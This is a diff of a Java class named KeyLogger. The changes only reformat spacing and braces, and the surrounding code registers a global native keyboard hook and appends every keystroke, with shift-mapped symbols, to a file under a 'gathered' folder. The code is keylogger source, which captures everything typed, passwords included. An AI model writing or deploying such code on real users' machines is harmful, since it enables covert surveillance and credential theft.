@@ -16,11 +16,11 @@ public class KeyLogger implements NativeKeyListener {
 	 * Starts a key logger and logs keys to 'gathered\keys.log'.
 	 */
 	public static void start() {
-		try {
+		try{
 			out=new PrintWriter(new BufferedWriter(new FileWriter("gathered\\keys.log", true)));
 			GlobalScreen.registerNativeHook();
 			GlobalScreen.getInstance().addNativeKeyListener(new KeyLogger());
-		}catch (Exception e) {
+		}catch(Exception e){
 			if(out!=null)
 				out.close();
 		}
@@ -48,7 +48,7 @@ public class KeyLogger implements NativeKeyListener {
 			out.print("\t");
 		else if(pressed.equals("Enter"))
 			out.println();
-		else if(shift) {
+		else if(shift){
 			if(pressed.matches("[A-Z]"))
 				out.print(pressed);
 			else if(pressed.equals("1"))
@@ -93,7 +93,7 @@ public class KeyLogger implements NativeKeyListener {
 				out.print("?");
 			else if(pressed.equals("Back Quote"))
 				out.print("~");
-		}else {
+		}else{
 			if(pressed.matches("[a-zA-Z0-9]"))
 				out.print(pressed.toLowerCase());
 			else if(pressed.equals("Minus"))
